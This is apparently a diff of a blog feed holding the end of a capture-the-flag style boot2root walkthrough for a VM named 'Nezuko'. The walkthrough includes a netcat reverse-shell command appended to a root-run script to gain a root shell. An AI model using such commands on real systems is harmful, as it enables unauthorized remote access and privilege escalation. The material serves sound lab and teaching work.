-<p><img src="/musubi/assets/vm_nezuko/lsattr.png" alt="lsattr" /></p>
-
-<p>With a slight modification to our command, we managed to append our own command which will connect to our Kali.</p>
-
-<figure class="highlight"><pre><code class="language-bash" data-lang="bash">zenitsu@ubuntu:~/to_nezuko<span class="nv">$echo</span> <span class="s2">"nc -e /bin/bash 10.10.10.5 1234"</span> <span class="o">&gt;&gt;</span> send_message_to_nezuko.sh</code></pre></figure>
-
-<p>Set up our listener to listen on port 1234</p>
-
-<p><img src="/musubi/assets/vm_nezuko/listener_1234.png" alt="listener_1234" /></p>
-
-<p>After waiting for couple of minutes for the script to be executed, we managed to get a root shell!</p>
-
-<p><img src="/musubi/assets/vm_nezuko/root.png" alt="root" /></p>
-
-<h3 id="wrap-up">Wrap up</h3>
-
-<p>Thank you for taking your time to read the writeup and I hope you enjoyed playing with my first vm. :&gt;</p>
-
-<p>Check out also <a href="/musubi/others/vm_aqua">vm_aqua</a></p>]]></content><author><name>yunaranyancat</name></author><category term="jekyll" /><summary type="html"><![CDATA[Hi there. This is my boot2root writeup for a vm called “Nezuko”. For those who didn’t manage to play with it, download the vm and come back when you have finished.]]></summary></entry></feed>
+<p><img src="/musubi/assets/binary0x01/newyear.gif" alt="ny" /></p>]]></content><author><name>yunaranyancat</name></author><category term="jekyll" /><summary type="html"><![CDATA[It is time to play with the most simplest form of binary exploitation, vanilla EIP overwrite buffer overflow with no stack protection.]]></summary></entry></feed>
